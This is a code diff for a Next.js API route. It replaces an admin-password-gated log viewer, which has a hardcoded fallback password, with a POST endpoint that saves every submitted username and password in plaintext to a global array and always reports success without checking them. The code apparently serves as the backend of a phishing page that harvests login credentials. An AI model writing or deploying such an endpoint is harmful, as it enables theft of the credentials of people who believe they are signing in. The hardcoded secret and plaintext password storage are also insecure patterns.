@@ -1,13 +1,20 @@
 import { NextResponse } from 'next/server';
 
-export async function GET(request) {
-  const secretKey = request.headers.get('x-admin-password');
-  const MASTER_PASSWORD = process.env.ADMIN_PASSWORD || 'MySuperSecretAdminPassword123';
+// Initialize global storage for logs if it doesn't exist
+if (!global.loginLogs) {
+  global.loginLogs = [];
+}
 
-  if (secretKey !== MASTER_PASSWORD) {
-    return NextResponse.json({ error: `Unauthorized` }, { status: 401 });
+export async function POST(request) {
+  try {
+    const { username, password } = await request.json();
+
+    // Record the submitted credentials along with a timestamp
+    const timestamp = new Date().toLocaleString();
+    global.loginLogs.unshift({ username, password, timestamp });
+
+    return NextResponse.json({ success: true });
+  } catch (err) {
+    return NextResponse.json({ error: 'Failed to process login' }, { status: 500 });
   }
-
-  const logs = global.loginLogs || [];
-  return NextResponse.json({ logs });
 }
